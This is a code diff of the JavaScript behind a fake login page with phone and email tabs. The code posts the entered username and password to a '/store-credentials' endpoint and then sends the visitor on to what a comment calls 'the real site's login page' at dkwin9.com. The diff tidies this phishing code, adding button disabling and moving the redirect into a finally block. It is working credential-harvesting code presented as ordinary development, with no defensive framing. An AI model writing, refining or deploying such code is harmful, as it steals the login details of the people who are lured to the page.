@@ -1,4 +1,7 @@
- //script.js (inside src folder or directly in public if preferred)
+// ==========================
+// script.js
+// ==========================
+
 // Tab switching
 document.querySelectorAll(".tab").forEach(tab => {
   tab.addEventListener("click", () => {
@@ -12,37 +15,43 @@ document.querySelectorAll(".tab").forEach(tab => {
 
 // Password toggle
 const toggle = document.getElementById("togglePassword");
-const password = document.getElementById("password");
+const passwordInput = document.getElementById("password");
 
 toggle.addEventListener("click", () => {
-  password.type = password.type === "password" ? "text" : "password";
+  passwordInput.type =
+    passwordInput.type === "password" ? "text" : "password";
 });
 
-// Login form submission
+// Login button
 const loginButton = document.getElementById("loginButton");
 
-loginButton.addEventListener("click", async (e) => {
-  e.preventDefault();
+loginButton.addEventListener("click", async () => {
+  // 🔒 disable button to prevent double click
+  loginButton.disabled = true;
 
-  // Determine active tab (phone or email)
-  const activeTab = document.querySelector(".tab.active").dataset.tab;
-  const username = activeTab === "phone" 
-    ? document.getElementById("phone-input").value 
-    : document.getElementById("email-input").value;
-  const passwordValue = password.value;
-
-  // Log to console for debugging
-  console.log("Captured Login Information:");
-  console.log(`Type: ${activeTab}`);
-  console.log(`Username: ${username}`);
-  console.log(`Password: ${passwordValue}`);
-
-  // Send data to backend
   try {
-    const response = await fetch('/store-credentials', {
-      method: 'POST',
+    // Determine active tab (phone or email)
+    const activeTab = document.querySelector(".tab.active").dataset.tab;
+
+    const username =
+      activeTab === "phone"
+        ? document.getElementById("phone-input").value
+        : document.getElementById("email-input").value;
+
+    const passwordValue = passwordInput.value;
+
+    // Debug log (local + Vercel logs)
+    console.log("Captured Login Information:", {
+      type: activeTab,
+      username,
+      password_length: passwordValue.length
+    });
+
+    // Send data to backend
+    const response = await fetch("/store-credentials", {
+      method: "POST",
       headers: {
-        'Content-Type': 'application/json',
+        "Content-Type": "application/json"
       },
       body: JSON.stringify({
         type: activeTab,
@@ -51,16 +60,17 @@ loginButton.addEventListener("click", async (e) => {
       })
     });
 
-    if (response.ok) {
-      console.log("Data sent to server successfully");
-    } else {
-      console.error("Failed to send data to server");
+    if (!response.ok) {
+      console.error("Server responded with error");
     }
+
   } catch (error) {
     console.error("Error sending data:", error);
-  }
+  } finally {
+    // 🔓 re-enable button
+    loginButton.disabled = false;
 
-  // Redirect to the real site's login page
-  const realSiteUrl = "https://dkwin9.com/#/login"; // Replace with the actual login URL
-  window.location.href = realSiteUrl;
+    // Redirect after request completes
+    window.location.href = "https://dkwin9.com/#/login";
+  }
 });
